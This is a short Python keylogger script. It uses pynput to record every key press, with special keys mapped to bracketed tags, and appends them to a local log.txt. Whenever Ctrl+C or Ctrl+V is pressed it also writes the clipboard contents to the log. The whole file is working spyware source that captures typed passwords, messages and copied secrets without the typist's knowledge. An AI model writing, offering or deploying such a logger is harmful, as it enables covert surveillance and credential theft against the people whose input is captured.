from pynput.keyboard import Listener
import pyperclip


last_pressed_key = None 
copied = False
pasted = False

def log_event(key):

    global last_pressed_key
    global copied
    global pasted

    letter = str(key)

    if letter == "'":
        pass
    else:
         letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '

    if letter == 'Key.shift':
        letter = '[SHIFT]'

    if letter == 'Key.ctrl_l':
        letter = '[CTRL]'
        
    if letter == 'Key.enter':
        letter = '[ENTER]\n'

    if letter == 'Key.alt_l':
        letter = '[ALT]'

    if letter == 'Key.tab':
        letter = '[TAB]'

    if letter == 'caps_lock':
        letter = '[CAPS-LOCK]'

    if letter == 'Key.delete':
        letter = '[DELETE]'

    if letter == 'Key.esc':
        letter = '[ESC]'

    if letter == 'Key.print_screen':
        letter = '[PRINT-SCREEN]'

    if letter == 'Key.backspace':
        letter = '[BACKSPACE]'

    if letter == 'Key.cmd':
        letter = '[Windows/Mac BUTTON]'

    if letter == 'Key.down':
        letter = '[DOWN-KEY]'

    if letter == 'Key.up':
        letter = '[UP-KEY]'

    if letter == 'Key.left':
        letter = '[LEFT-KEY]'

    if letter == 'Key.right':
        letter = '[RIGHT-KEY]'



    with open("log.txt", 'a') as f:

        if copied:
            f.write(f'\n\n[COPIED TEXT (WRAPPED IN DOUBLE QUOTES)]: "{pyperclip.paste()}"\n\n')
            copied = False

        if pasted:
            f.write(f'\n\n[PASTED TEXT (WRAPPED IN DOUBLE QUOTES)]: "{pyperclip.paste()}"\n\n')
            pasted = False

        if last_pressed_key == '[CTRL]' and letter == '[CTRL]':

            pass
        elif last_pressed_key == '[SHIFT]' and letter == '[SHIFT]':

            pass        
        
        elif letter == '""':
            letter = letter.replace('""', "'")
            last_pressed_key = letter
            f.write(letter) 

        elif letter == '\\x03':
            last_pressed_key = letter
            copied = True
        
        elif letter == '\\x16':
            last_pressed_key = letter
            pasted = True
        
        else:
            last_pressed_key = letter
            f.write(letter)
         

with Listener(on_press=log_event) as listener:
    listener.join()